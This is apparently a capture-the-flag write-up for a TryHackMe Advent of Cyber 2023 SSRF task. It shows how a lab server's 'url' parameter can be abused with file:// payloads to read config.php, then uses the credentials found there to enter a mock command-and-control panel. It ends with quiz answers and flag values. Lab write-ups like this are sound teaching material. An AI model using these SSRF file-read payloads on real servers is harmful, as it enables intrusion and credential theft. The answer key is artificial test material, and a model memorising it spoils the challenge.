# Task 28  [Day 22] SSRF Jingle Your SSRF Bells: A Merry Command & Control Hackventure

---

Learning Objectives
- Understanding server-side request forgery (SSRF)
- Which different types of SSRF are used to exploit the vulnerability
- Prerequisites for exploiting the vulnerability
- How the attack works
- How to exploit the vulnerability
- Mitigation measures for protection

---

When the machine is up add hostname to /etc/hosts file. as mentioned in this challenge.

Now You can access the C2 server by visiting the URL http://mcgreedysecretc2.thm 

<img width="1303" alt="Screenshot 2024-01-15 at 3 17 05 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/427b4082-427b-4984-b4ff-c82f23419975">

---

Exploiting the response:  We noticed that if we change the URL parameter to any other file on the host, we can still fetch the file like http://10.10.100.212/getClientData.php?url=file:////var/www/html/index.php will fetch the contents of  index.php.

now replace index.php with config.php

http://10.10.100.212/getClientData.php?url=file:////var/www/html/config.php

---

<img width="1292" alt="Screenshot 2024-01-15 at 3 20 59 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/0fbc5297-5083-4c86-a506-e30960a8339e">

---

```
$username = "mcgreedy";
$password = "mcgreedy!@#$%";
```

Use above creds to log in: http://mcgreedysecretc2.thm/

---

<img width="1308" alt="Screenshot 2024-01-15 at 3 23 37 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/5eca10f5-716a-443e-aa4d-10b9ac13ee27">


---


**QUESTIONS**

1. Is SSRF the process in which the attacker tricks the server into loading only external resources (yea/nay)?

ANSWER
```
nay
```

---

2. What is the C2 version?

ANSWER
```
1.1
```


3.What is the username for accessing the C2 panel?

ANSWER
```
mcgreedy
```


4. What is the flag value after accessing the C2 panel?

ANSWER
```
THM{EXPLOITED_31001}
```

5. What is the flag value after stopping the data exfiltration from the McSkidy computer?

ANSWER
```
THM{AGENT_REMOVED_1001}
```

To get the flag remove McSkidy PC 

<img width="1440" alt="Screenshot 2024-01-15 at 3 27 55 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/e703a0e2-1eeb-4190-9599-075771a6c88f">


<img width="1440" alt="Screenshot 2024-01-15 at 3 28 02 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/485a7963-3d8e-474d-b0f5-a7a96515dc59">




---




